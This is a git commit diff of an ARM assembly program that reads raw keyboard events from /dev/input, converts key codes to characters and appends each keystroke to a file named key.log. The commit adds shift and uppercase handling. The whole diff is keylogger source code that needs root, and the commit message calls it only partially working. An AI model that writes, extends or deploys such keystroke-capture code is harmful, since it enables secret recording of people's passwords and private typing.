a1ac26bf7bc42475b4799cbcb15317765a6274d4
raykaryshyn <raykaryshyn@gmail.com>
2022-07-03 13:29:40 -0400

    partially woking shift

--- main.s
+++ main.s
@@ -2,51 +2,71 @@
 
 .section .text
 _start:
-	MOV R7, #5
-	LDR R0, =dest
-	LDR R1, =02101
-	MOV R2, #420
-	SWI #0
+	@ open destination file
+        MOV R7, #5
+        LDR R0, =dest
+        LDR R1, =02101
+        MOV R2, #420
+        SWI #0
+        MOV R11, R0
 
-	MOV R11, R0
-
-	MOV R7, #5
-	LDR R0, =source
-	MOV R1, #0
-	SWI #0
-
-	MOV R12, R0
+	@ open source file
+        MOV R7, #5
+        LDR R0, =source
+        MOV R1, #0
+        SWI #0
+        MOV R12, R0
 
 loop:
-	MOV R7, #3
-	MOV R0, R12
-	LDR R1, =input_event
-	MOV R2, #16
-	SWI #0
+	@ get next input event
+        MOV R7, #3
+        MOV R0, R12
+        LDR R1, =input_event
+        MOV R2, #16
+        SWI #0
 
-	LDR R0, =input_event
-	LDR R0, [R0, #8]
+	@ save input type
+        LDR R0, =input_event
+        LDR R0, [R0, #8]
+        MOV R1, #0xFF00
+        ORR R1, R1, #0xFF
+        AND R0, R0, R1
 
-	MOV R1, #0xFF00
-	ORR R1, R1, #0xFF
-	AND R0, R0, R1
+	@ skip if input type == 0
+        CMP R0, #0
+        BEQ loop
 
-	CMP R0, #0
-	BEQ loop
+	@ skip if input type == 4
+        CMP R0, #4
+        BEQ loop
 
-	CMP R0, #4
-	BEQ loop
-
-	LDR R0, =input_event
+	@ save input value
+        LDR R0, =input_event
         LDR R0, [R0, #12]
 
-	CMP R0, #0
-	BEQ loop
+	@ skip if input value == 0 (release)
+        CMP R0, #0
+        BEQ check1
+	B nocheck1
 
-	LDR R0, =input_event
+check1:
+	CMP R0, #42
+	BEQ check2
+	B loop
+
+check2:
+	LDR R9, =shift
+        MOV R8, #0
+        STR R8, [R9]
+	B loop
+
+nocheck1:
+	@ save input code (key)
+        LDR R0, =input_event
         LDR R0, [R0, #10]
-	AND R0, R0, R1
+        AND R0, R0, R1
 
+	@ check if key is a shift
         CMP R0, #42
         BEQ shifter
         B nonshift
@@ -58,42 +78,49 @@ shifter:
         B loop
 
 nonshift:
-	LDR R1, =toASCII
-	LDR R0, [R1, R0]
+	LDR R9, =shift
+	LDR R8, [R9]
+	CMP R8, #0
+	BEQ lower
 
-	AND R0, R0, #0xFF
-	MOV R10, R0
+upper:
+	LDR R1, =upperCase
+        LDR R0, [R1, R0]
+	B write
+
+lower:
+        LDR R1, =toASCII
+        LDR R0, [R1, R0]
 
 write:
-	LDR R9, =character
-	STR R10, [R9]
+        AND R0, R0, #0xFF
+        MOV R10, R0
+        LDR R9, =character
+        STR R10, [R9]
 
-	MOV R7, #4
-	MOV R0, R11
-	LDR R1, =character
-	MOV R2, #1
-	SWI #0
+        MOV R7, #4
+        MOV R0, R11
+        LDR R1, =character
+        MOV R2, #1
+        SWI #0
 
-@	MOV R7, #6
-@	MOV R0, R11
-@	SWI #0
-
-	B loop
+        B loop
 
 _end:
-	MOV R0, #0x1010
-	MOV R7, #1
-	SWI #0
+        MOV R7, #1
+        SWI #0
 
 .section .data
-	dest: .asciz "key.log"
-	source: .asciz "/dev/input/event3"
-	toASCII:   .ascii "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./??? ???????????????????"
-		   .ascii "????????????????????????????????????????????????????????????????????????????????"
-	upperCase: .ascii "??!@#$%^&*()_+??QWERTYUIOP{}|ASDFGHJKL:\"~?|ZXCVBNM<>?"
-	errMsg: .asciz "Error: Program must be ran as root\n"
-	lenErrMsg = .-errMsg
+        dest: .asciz "key.log"
+        source: .asciz "/dev/input/event1"
 
-	input_event: .fill 16, 1, 0
-	character: .byte 0
-	shift: .byte 0
+	toASCII:   .ascii "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./??? ???????????????????"
+                   .ascii "????????????????????????????????????????????????????????????????????????????????"
+        upperCase: .ascii "??!@#$%^&*()_+??QWERTYUIOP{}|ASDFGHJKL:\"~?|ZXCVBNM<>?"
+
+	errMsg: .asciz "Error: Program must be ran as root.\n"
+        lenErrMsg = .-errMsg
+
+        input_event: .fill 16, 1, 0
+        character: .byte 0
+        shift: .byte 0
